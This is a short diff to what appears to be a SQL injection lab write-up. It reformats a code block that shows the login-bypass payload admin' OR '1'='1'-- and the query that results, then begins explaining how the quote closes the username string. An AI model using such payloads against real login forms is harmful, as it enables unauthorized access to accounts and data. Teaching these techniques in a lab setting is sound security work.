@@ -16,7 +16,8 @@ To solve this lab, inject the following payload :
 ### password => anything
 
 The resulting SQL becomes:
-``` SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything';
+```
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything';
 ```
 ## Explanation
 admin' — the extra single quote (') closes the username text the app expected.
